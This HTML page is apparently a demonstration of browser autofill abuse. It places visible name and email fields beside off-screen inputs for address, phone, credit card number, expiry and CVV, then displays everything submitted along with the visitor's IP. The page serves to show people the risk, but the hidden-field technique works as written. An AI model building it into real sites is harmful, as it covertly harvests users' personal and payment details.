<!doctype html>
<html>
  <head>
    <title>AUTOFILL</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap');

  *{
    margin:0;
    padding:0;
    box-sizing:border-box;
  }

  body{
    font-family:'JetBrains Mono', monospace;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:30px;
    overflow:hidden;
    color:#d8ffb0;

    background:
      radial-gradient(circle at top left, rgba(140,255,0,0.12), transparent 30%),
      radial-gradient(circle at bottom right, rgba(0,255,100,0.08), transparent 30%),
      linear-gradient(135deg,#020202 0%, #050505 45%, #0b0b0b 100%);
  }

  /* Animated background glow */
  body::before{
    content:'';
    position:fixed;
    inset:0;
    background:
      repeating-linear-gradient(
        to bottom,
        rgba(140,255,0,0.03),
        rgba(140,255,0,0.03) 1px,
        transparent 1px,
        transparent 3px
      );
    pointer-events:none;
    animation: scanline 8s linear infinite;
  }

  @keyframes scanline{
    from{ transform:translateY(0); }
    to{ transform:translateY(100px); }
  }

  .container{
    position:relative;
    width:100%;
    max-width:540px;
    padding:45px 38px;
    border-radius:24px;

    background:rgba(5,5,5,0.88);
    border:1px solid rgba(140,255,0,0.18);

    box-shadow:
      0 0 20px rgba(140,255,0,0.08),
      0 0 80px rgba(140,255,0,0.05),
      inset 0 0 30px rgba(140,255,0,0.03);

    backdrop-filter:blur(12px);
    overflow:hidden;
  }

  /* Neon border glow */
  .container::before{
    content:'';
    position:absolute;
    inset:0;
    border-radius:24px;
    padding:1px;
    background:linear-gradient(
      135deg,
      rgba(140,255,0,0.5),
      transparent,
      rgba(140,255,0,0.2)
    );

    -webkit-mask:
      linear-gradient(#fff 0 0) content-box,
      linear-gradient(#fff 0 0);
            mask:
      linear-gradient(#fff 0 0) content-box,
      linear-gradient(#fff 0 0);

    -webkit-mask-composite:xor;
            mask-composite:exclude;

    pointer-events:none;
  }

  h2{
    text-align:center;
    font-size:2.3rem;
    font-weight:700;
    margin-bottom:12px;
    letter-spacing:2px;
    text-transform:uppercase;

    color:#9dff00;
    text-shadow:
      0 0 10px rgba(157,255,0,0.7),
      0 0 25px rgba(157,255,0,0.4);
  }

  h2::after{
    content:'[ AUTOFILL EXPLOIT DEMO ]';
    display:block;
    margin-top:10px;
    font-size:0.8rem;
    font-weight:400;
    color:#7d9b5c;
    letter-spacing:1px;
  }

  .form-group{
    margin-bottom:22px;
  }

  label{
    display:block;
    margin-bottom:10px;
    font-size:0.9rem;
    color:#a8ff60;
    letter-spacing:0.5px;
  }

  .form-control{
    width:100%;
    height:56px;
    padding:0 18px;

    background:rgba(140,255,0,0.03);
    border:1px solid rgba(140,255,0,0.15);
    border-radius:14px;

    color:#dfffbc;
    font-size:0.95rem;

    transition:all 0.25s ease;
    box-shadow:none !important;
  }

  .form-control::placeholder{
    color:#6d8c50;
  }

  .form-control:focus{
    border-color:#9dff00;
    background:rgba(140,255,0,0.06);

    box-shadow:
      0 0 0 3px rgba(157,255,0,0.12),
      0 0 25px rgba(157,255,0,0.18) !important;

    color:#ffffff;
  }

  .btn-primary{
    width:100%;
    height:56px;
    border:none;
    border-radius:14px;

    background:linear-gradient(
      135deg,
      #8fff00,
      #5cb800
    );

    color:#050505;
    font-weight:700;
    font-size:1rem;
    letter-spacing:1px;
    text-transform:uppercase;

    transition:all 0.25s ease;
    position:relative;
    overflow:hidden;
  }

  .btn-primary::before{
    content:'';
    position:absolute;
    top:0;
    left:-120%;
    width:100%;
    height:100%;

    background:linear-gradient(
      120deg,
      transparent,
      rgba(255,255,255,0.35),
      transparent
    );

    transition:0.6s;
  }

  .btn-primary:hover::before{
    left:120%;
  }

  .btn-primary:hover{
    transform:translateY(-2px);

    box-shadow:
      0 0 20px rgba(157,255,0,0.35),
      0 0 45px rgba(157,255,0,0.18);

    background:linear-gradient(
      135deg,
      #b7ff4a,
      #7aff00
    );
  }

  .btn-primary:active{
    transform:scale(0.98);
  }

  .modal-content{
    background:#050505;
    color:#dfffbc;

    border-radius:20px;
    border:1px solid rgba(140,255,0,0.18);

    box-shadow:0 0 30px rgba(157,255,0,0.12);
  }

  .modal-header,
  .modal-footer{
    border-color:rgba(140,255,0,0.12);
    background:rgba(140,255,0,0.03);
  }

  .modal-title{
    color:#9dff00;
    text-shadow:0 0 10px rgba(157,255,0,0.4);
  }

  .modal-body{
    color:#c9ff9d;
    line-height:1.7;
  }

  .btn-secondary{
    background:#101010;
    border:1px solid rgba(140,255,0,0.18);
    color:#a8ff60;
    border-radius:12px;
    transition:0.25s ease;
  }

  .btn-secondary:hover{
    background:#161616;
    box-shadow:0 0 18px rgba(157,255,0,0.18);
  }

  .close{
    color:#9dff00;
    opacity:0.8;
  }

  .close:hover{
    color:#c4ff78;
    opacity:1;
  }

  .off-screen{
    position:absolute;
    left:-9999px;
    opacity:0;
    pointer-events:none;
  }

  /* GitHub corner */
  .github-corner svg{
    fill:#9dff00 !important;
    color:#050505 !important;
    transition:0.3s ease;
  }

  .github-corner:hover svg{
    fill:#c4ff78 !important;
    transform:scale(1.05);
  }

  @media(max-width:576px){

    body{
      padding:18px;
    }

    .container{
      padding:32px 24px;
    }

    h2{
      font-size:1.8rem;
    }

    .form-control,
    .btn-primary{
      height:52px;
    }
  }
</style>
         <!-- GitHub Ribbon -->
     <a href="https://github.com/J0hns0nJ0y/AutoFillDanger" class="github-corner"
     aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250"
         style="fill:#fff; color:#151513; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
         <path
             d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
             fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
         <path
             d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
             fill="currentColor" class="octo-body"></path>
     </svg></a>
  </head>
  <body>
    <div class="container mt-5">
      <h2>Autofill Danger!</h2>
      <form id="phishingForm">
        <div class="form-group">
          <label for="name">Name</label>
          <input id="name" name="name" type="text" class="form-control" placeholder="Your Name">
        </div>
        <div class="form-group">
          <label for="email">Email</label>
          <input id="email" name="email" type="email" class="form-control" placeholder="Your Email">
        </div>
        <div class="form-group">
          <input type="submit" value="Submit" class="btn btn-primary">
        </div>
        <div class="form-group off-screen">
          <input id="phone" name="phone" type="text" placeholder="Your Phone" class="form-control">
        </div>
        <div class="form-group off-screen">
          <input id="organization" name="organization" type="text" placeholder="Your Organization" class="form-control">
        </div>
        <div class="form-group off-screen">
          <input id="address" name="address" type="text" placeholder="Your Address" class="form-control">
        </div>
        <div class="form-group off-screen">
          <input id="postal" name="postal" type="text" placeholder="Your Postal Code" class="form-control">
        </div>
        <div class="form-group off-screen">
          <input id="city" name="city" type="text" placeholder="Your City" class="form-control">
        </div>
        <div class="form-group off-screen">
            <input id="state" name="state" type="text" placeholder="Your State" class="form-control">
          </div>
        <div class="form-group off-screen">
          <select name="country" class="form-control">
            <option value=""></option>
            <option value="FI">Finland</option>
          </select>
        </div>
        <div class="form-group off-screen">
          <input type="text" name="cc_number" class="form-control">
        </div>
        <div class="form-group off-screen">
          <select name="cc_month" id="cc_month" class="form-control">
            <option value="01">01</option>
            <option value="02">02</option>
          </select>
          <select name="cc_year" id="cc_year" class="form-control">
            <option>2024</option>
          </select>
        </div>
        <div class="form-group off-screen">
          <input type="text" id="cc_cvv" name="cc_cvv" class="form-control">
        </div>
      </form>
    </div>

    <div class="modal fade" id="resultModal" tabindex="-1" role="dialog" aria-labelledby="resultModalLabel" aria-hidden="true">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title" id="resultModalLabel">Form Submission Data</h5>
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
          </div>
          <div class="modal-body">
            <p id="resultContent"></p>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script type="text/javascript">
      function displayModal(content) {
        document.getElementById('resultContent').innerHTML = content;
        $('#resultModal').modal('show');
      }

async function getClientIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return 'Unable to retrieve IP';
  }
}

document.getElementById('phishingForm').addEventListener('submit', async function(event) {
  event.preventDefault();
  const formData = new FormData(event.target);
  let resultText = 'You submitted the following data:<br>';
  formData.forEach((value, key) => {
    resultText += `<strong>${key}:</strong> ${value}<br>`;
  });

  const ipAddress = await getClientIP();
  resultText += `<strong>IP Address:</strong> ${ipAddress}<br>`;

  displayModal(resultText);
});

    </script>
  </body>
</html>
